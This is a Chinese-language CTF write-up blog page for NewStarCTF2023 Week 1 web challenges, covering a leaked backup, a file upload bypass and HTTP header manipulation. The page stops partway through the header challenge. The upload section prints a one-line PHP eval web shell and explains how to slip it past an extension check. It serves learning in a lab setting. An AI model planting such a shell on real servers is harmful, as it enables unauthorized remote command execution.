@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <head>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>NewStarCTF2023-Week1-Web - 好好学习</title><meta name="author" content="alextang">
+<meta name="author-link" content="">
+<meta name="description" content="写在前面 Web题目总共7题，截至10-1日晚本人做题情况为： 题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一" /><meta name="keywords" content='Web, CTF, WriteUp' />
+  <meta itemprop="name" content="NewStarCTF2023-Week1-Web">
+  <meta itemprop="description" content="写在前面 Web题目总共7题，截至10-1日晚本人做题情况为： 题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一">
+  <meta itemprop="datePublished" content="2023-10-02T10:41:00+08:00">
+  <meta itemprop="dateModified" content="2023-10-02T10:41:00+08:00">
+  <meta itemprop="wordCount" content="1798">
+  <meta itemprop="keywords" content="Web,CTF,WriteUp"><meta property="og:url" content="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/">
+  <meta property="og:site_name" content="好好学习">
+  <meta property="og:title" content="NewStarCTF2023-Week1-Web">
+  <meta property="og:description" content="写在前面 Web题目总共7题，截至10-1日晚本人做题情况为： 题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一">
+  <meta property="og:locale" content="zh_CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-10-02T10:41:00+08:00">
+    <meta property="article:modified_time" content="2023-10-02T10:41:00+08:00">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="CTF">
+    <meta property="article:tag" content="WriteUp">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="NewStarCTF2023-Week1-Web">
+  <meta name="twitter:description" content="写在前面 Web题目总共7题，截至10-1日晚本人做题情况为： 题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一">
+      <meta name="twitter:site" content="@a1extang">
+<meta name="application-name" content="a1extang">
+<meta name="apple-mobile-web-app-title" content="a1extang"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://alextang.top/articles/2023/10/newstarctf2023-week1-web/" /><link rel="prev" href="https://alextang.top/articles/2023/09/re-or-pwn/" /><link rel="next" href="https://alextang.top/articles/2023/10/newstarctf2023-week1-pwn/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.2/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "NewStarCTF2023-Week1-Web",
+    "inLanguage": "zh-CN",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/alextang.top\/articles\/2023\/10\/newstarctf2023-week1-web\/"
+    },"genre": "posts","keywords": "Web, CTF, WriteUp","wordcount":  1798 ,
+    "url": "https:\/\/alextang.top\/articles\/2023\/10\/newstarctf2023-week1-web\/","datePublished": "2023-10-02T10:41:00+08:00","dateModified": "2023-10-02T10:41:00+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "alextang"
+      },"description": ""
+  }
+  </script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><script>(window.localStorage?.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('data-theme', 'dark');</script><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/posts/"
+                
+                
+              ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/categories/"
+                
+                
+              ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/tags/"
+                
+                
+              ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li class="menu-item">
+              <a
+                class="menu-link"
+                href="/about/"
+                title="关于"
+                
+              ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="好好学习"><span class="header-title-text">a1extang</span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/posts/"
+                  
+                  
+                ><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> 文章</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/categories/"
+                  
+                  
+                ><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> 分类</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/tags/"
+                  
+                  
+                ><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> 标签</a></li><li
+              class="menu-item"
+            ><a
+                  class="menu-link"
+                  href="/about/"
+                  title="关于"
+                  
+                ><i class="fas fa-user fa-fw fa-sm" aria-hidden="true"></i> 关于</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="toc" id="toc-auto"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside>
+
+  <aside class="aside-custom">
+    </aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>NewStarCTF2023-Week1-Web</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/1693637676533.jpg?size=large 2x" sizes="auto" data-title="alextang" data-alt="alextang" class="avatar" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;alextang</span></span>
+          <span class="post-category">收录于 <a href="/categories/writeup/"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> WriteUp</a></span></div>
+      <div class="post-meta-line"><span title="发布于 2023-10-02 10:41:00"><i class="fa-regular fa-calendar-alt fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-02">2023-10-02</time></span>&nbsp;<span title="更新于 2023-10-02 10:41:00"><i class="fa-regular fa-edit fa-fw me-1" aria-hidden="true"></i><time datetime="2023-10-02">2023-10-02</time></span>&nbsp;<span title="1798 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 4 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#begin-of-upload">Begin of Upload</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h1 id="写在前面">写在前面</h1>
+<p>Web题目总共7题，截至10-1日晚本人做题情况为：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002104444169.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002104444169.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002104444169.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002104444169.png?size=large 2x" sizes="auto" data-title="image-20231002104444169" data-alt="image-20231002104444169" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>题目还是比较基础的，RCE的PHP非法字符是真的没有接触过，这也是比较有收获的一点。最后一题其实压根没往弱口令的方向去想，以后涉及到登录的题目第一想法肯定得是弱口令。</p>
+<h1 id="泄露的秘密">泄露的秘密</h1>
+<p>这题我压根没扫dir，试了一下www.zip结果就直接出来了。
+<img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105427736.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105325895.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>一个是robot.txt一个是index.php</p>
+<p>结果为：flag{r0bots_1s_s0_us3ful_4nd_www.zip_1s_s0_d4ng3rous}</p>
+<h2 id="begin-of-upload">Begin of Upload</h2>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105646430.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>显然是需要上传马的。这里一定要看下前端有没有拦截：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002105726833.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>发现有限制拓展名，那这里就先改名Jpg上传。暂时不知道后端有没有拦截，因此先试试直接改包</p>
+<div class="highlight" id="id-1"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>将一句话木马保存为shell.jpg上传，抓包：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110204238.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>直接将后缀改为php，发现上传成功：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110248283.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>直接蚁剑连接就可拿到flag：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110459278.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h1 id="begin-of-http">Begin of HTTP</h1>
+<p>发现是闯关类的</p>
+<p>第一个GET传参很简单：<img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110740716.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110740716.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110740716.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110740716.png?size=large 2x" sizes="auto" data-title="image-20231002110740716" data-alt="image-20231002110740716" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>?ctf=1即可</p>
+<p>第二关POST传参，发现secert在源码里：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110822640.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110822640.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110822640.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002110822640.png?size=large 2x" sizes="auto" data-title="image-20231002110822640" data-alt="image-20231002110822640" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<div class="highlight" id="id-2"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- Secret: base64_decode(bjN3c3Q0ckNURjIwMjNnMDAwMDBk) --&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>解码后得：n3wst4rCTF2023g00000d</p>
+<p>使用hackbar或者抓包传参即可：</p>
+<p><img loading="lazy" src="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111012082.png" srcset="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111012082.png?size=small, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111012082.png?size=medium 1.5x, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111012082.png?size=large 2x" sizes="auto" data-title="C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231002111012082.png" data-alt="C:\Users\alext\AppData\Roaming\Typora\typora-user-images\image-20231002111012082.png" class="suffix-invalid" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>第三关：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111124389.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111124389.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111124389.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111124389.png?size=large 2x" sizes="auto" data-title="image-20231002111124389" data-alt="image-20231002111124389" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/>显然是改文请求头，发现power在cookie中，直接改即可：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111159424.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>第四关：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111226081.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>和浏览器信息相关的请求头是User-Agent，直接改为NewStarCTF2023即可（不要加浏览器！）</p>
+<p><img loading="lazy" src="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111325615.png" srcset="C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111325615.png?size=small, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111325615.png?size=medium 1.5x, C:%5cUsers%5calext%5cAppData%5cRoaming%5cTypora%5ctypora-user-images%5cimage-20231002111325615.png?size=large 2x" sizes="auto" data-title="image-20231002111325615" data-alt="image-20231002111325615" class="suffix-invalid" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>第五关：</p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png?size=large 2x" sizes="auto" data-title="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png" data-alt="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231002111348681.png" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>从何处来？改Referer即可。</p>
